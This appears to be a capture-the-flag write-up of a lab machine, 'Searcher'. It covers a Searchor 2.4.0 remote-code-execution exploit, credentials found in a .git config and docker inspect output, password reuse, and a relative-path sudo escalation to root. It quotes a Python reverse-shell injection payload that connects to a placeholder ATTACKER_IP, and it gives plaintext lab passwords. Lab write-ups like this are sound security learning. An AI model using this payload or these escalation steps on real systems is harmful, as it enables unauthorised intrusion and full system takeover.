Main steps
1. Enumerating the website shows the backend software being used
2. Located a public exploit for the software to gain initial access
3. Enumerate git files to find gitea credentials
4. Tried gitea credentials against user account and got access
5. Enumerated sudo -l using the credential found
6. Ran the script as sudo and found another credential
7. Accessed gitea as another user and enumerated the script being run as sudo
8. Exploited a relative path in the script to run my own shell commands as sudo to gain root access

Learning points
1. git folder may contain interesting information such as credentials.
2. TRY ALL USER / PASSWORD COMBINATIONS
3. check scripts properly - relative paths can be exploited eg. ./script.sh will check for the current working directory first, can run your own script

Nmap
![[Pasted image 20260303192020.png]]
ports 22 and 80 open

Navigating to the IP redirects to searcher.htb > added to /etc/hosts
![[Pasted image 20260303192049.png]]

Nothing in the source code, attempting to inject SQL/ XSS, no results.

Noticed this note down here
![[Pasted image 20260303193906.png]]

Searched for the 'Searchor' version 2.4.0 and found a POC for and RCE for this version here https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-

Sending 
`', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#`
in the POST request will cause an RCE and create a remote shell.

Gained access as 'svc' using this POC and obtained user flag.
![[Pasted image 20260303194253.png]]

linepeas / lse enumeration showed nothing immediate
There is a .git repository in the initial directory - enumeration here shows a potential credential in the config file
**![[Pasted image 20260303201014.png]]

Added gitea.searcher.htb to /etc/hosts and logged in to the site using the credentials cody:jh1usoih2bkjaspwe92
![[Pasted image 20260303201329.png]]

Nothing on the gitea site other than a new user named 'administrator'.

Attempted to SSH using 'cody', unable to.
Attempted to use the password 'jh1usoih2bkjaspwe92' on 'svc' - works.
Enumerated sudo -l with 'svc'
![[Pasted image 20260303202543.png]]
'svc' can run this system-checkup.py script as root.

Listing out docker containers shows the gitea instance as well as a mysql.
Inspected the gitea docker config using `sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect {{.Config}} 960873171e2e` (format from https://docs.docker.com/reference/cli/docker/inspect/)
![[Pasted image 20260303203716.png]]
revealed a GITEA_database_PASSWD = yuiu1hoiu4i5ho1uh
Attempted to login to 'administrator' on gitea with this password, able to
![[Pasted image 20260303203812.png]]

Also tried to su root using this password, unable to
Enumerating the scripts repo in administrator's gitea shows that the full-checkup option of the checkup script call a .sh from a relative path. 
![[Pasted image 20260303210515.png]]
This allows me to write my own script named full-checkup.sh and run any shell commands as sudo from this python script.
![[Pasted image 20260303210617.png]]

Wrote a simple reverse shell into full-checkup.sh and ran the python script from the same folder, leading to a root shell.
![[Pasted image 20260303210658.png]]